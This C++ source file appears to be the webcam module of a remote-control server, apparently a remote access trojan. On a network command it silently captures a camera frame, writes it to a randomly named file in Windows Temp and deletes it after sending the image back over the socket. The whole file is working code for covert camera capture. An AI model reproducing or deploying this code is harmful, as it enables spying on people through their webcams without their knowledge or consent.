

#include "webcam_shot.h"
#include "file_utils.h"
#include "string_utils.h"
#include <fstream>

namespace http {
	namespace server{

		WebcamShot::WebcamShot(boost::asio::ip::tcp::socket& sock, boost::asio::io_service& io_ref):
			TaskHandlerInterface(sock, io_ref)
		{
			operations_queue_ptr = async_op::new_();
		}

		boost::system::error_code WebcamShot::take_picture(std::shared_ptr<vector<char>> buffer)
		{
			int iRes;
			const int JPEG_QUALITY = 100;
			vector<int> params;
			params.push_back(CV_IMWRITE_JPEG_QUALITY);
			params.push_back(JPEG_QUALITY);
			VideoCapture stream1(0);   //0 is the id of video device.0 if you have only one camera.
			if (!stream1.isOpened()) { //check if video device has been initialised
				cerr << "cannot open camera" << GetLastError();
				return boost::system::error_code(boost::system::errc::make_error_code(boost::system::errc::io_error));
			}
			Mat cameraFrame;
			stream1.read(cameraFrame);

			WCHAR WCHAR_WindowsPath[MAX_PATH];
			GetWindowsDirectory(WCHAR_WindowsPath, MAX_PATH);
			std::wstring arr_w(WCHAR_WindowsPath);
			std::string WindowsPath(arr_w.begin(), arr_w.end());
			WindowsPath.append("\\Temp\\");

			std::string randomFileName = string_utils::random_string(12);
			randomFileName.append(".jpg");
			WindowsPath.append(randomFileName);
			randomFileName = WindowsPath;
			wchar_t *lpszFilename = new wchar_t[randomFileName.length() + 1];
			mbstowcs(lpszFilename, randomFileName.c_str(), randomFileName.length() + 1);

			//HANDLE fHandle = file_utils::CreateFileWithAllPermissions(lpszFilename);
			//CloseHandle(fHandle);

			iRes = imwrite(randomFileName, cameraFrame, params);
			/*stream1.release();*/

			std::ifstream is(lpszFilename, std::ios::in | std::ios::binary);
			if (!is)
			{
				cerr << "failed to open a stream for screenshoot. err: %d\n" << GetLastError();
				return boost::system::error_code(boost::system::errc::make_error_code(boost::system::errc::io_error));
			}

			char buf[512];
			while (is.read(buf, sizeof(buf)).gcount() > 0)
				buffer->insert(buffer->end(), buf, buf + is.gcount());
			is.close();

			DeleteFile(lpszFilename);
			return boost::system::error_code(boost::system::errc::make_error_code(boost::system::errc::success));
		}

		void WebcamShot::on_take_picture(std::shared_ptr<request> req, std::shared_ptr<reply> rep, std::shared_ptr<vector<char>> buffer, boost::system::error_code& e)
		{
			if (buffer->empty())
			{
				std::shared_ptr<reply> temp_rep = reply::stock_reply(reply::internal_server_error);
				rep.swap(temp_rep);
			}
			else
			{
				std::string extension = "jpg";
				rep->status_line = http::server::status_strings::ok;
				rep->status_line.append(" ").append(req->action_type).append("\r\n");

				std::string s(buffer->data(), buffer->size());
				rep->content.append(s);

				rep->headers.resize(3);
				rep->headers[0].name = "Tag";
				rep->headers[0].value = std::string(req->dictionary_headers.at("Tag"));
				rep->headers[1].name = "Content-Type";
				rep->headers[1].value = mime_types::extension_to_type(extension);
				rep->headers[2].name = "Content-Length";
				rep->headers[2].value = std::to_string(rep->content.size());
			}
			async_write(socket_,
				rep->to_buffers(),
				boost::bind(&WebcamShot::handle_write,
					this, rep,
					boost::asio::placeholders::error,
					boost::asio::placeholders::bytes_transferred)
				);
		}

		void WebcamShot::handle_write(std::shared_ptr<reply> rep, const boost::system::error_code& e, std::size_t bytes)
		{
			rep.reset();
		}

		bool WebcamShot::execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep)
		{
			if (req->action_type.compare(wxhtpconstants::ACTION_TYPE::TAKE_WEBCAM_SCREEN))
			{
				return false;
			};

			std::shared_ptr<std::vector<char>> buffer_ptr = std::make_shared<std::vector<char>>();

			operations_queue_ptr->add(
				boost::bind(&WebcamShot::take_picture, this, buffer_ptr),
				boost::bind(&WebcamShot::on_take_picture, this, req, rep, buffer_ptr, _1), io_ref_);

			return true;
		}
	}
}
